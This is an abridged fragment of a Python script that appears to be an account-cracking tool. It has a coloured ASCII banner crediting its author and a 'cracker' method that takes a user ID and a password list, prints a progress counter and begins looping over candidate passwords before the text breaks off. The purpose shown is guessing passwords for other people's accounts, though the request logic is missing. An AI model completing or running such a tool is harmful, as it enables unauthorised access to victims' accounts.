...
logo =("""    
                    ...
                    [yellow bold]█████       [green bold] ██   ██      [yellow bold]█████  
                    [yellow bold]██   ██       [green bold]██ ██      [yellow bold]██   ██ 
                    [yellow bold]███████        [green bold]███       [yellow bold]███████ 
                    [yellow bold]██   ██       [green bold]██ ██      [yellow bold]██   ██ 
                    [yellow bold]██   ██      [green bold]██   ██     [yellow bold]██   ██ 
                                                                
                    [cyan bold]<\>CODDED BY MD ARAFAT HOSSEN<\>[cyan bold]
...
class Arafat:
    ...
    def cracker(self,uid,pas,tl):
       global loop,ok
       sys.stdout.write("\r\r\033[0;33m~>> IAM SEARCING ~>> %s ~>> OK ~>> %s \r"%(loop,ok));sys.stdout.flush()
       try:
          for ps in pas:
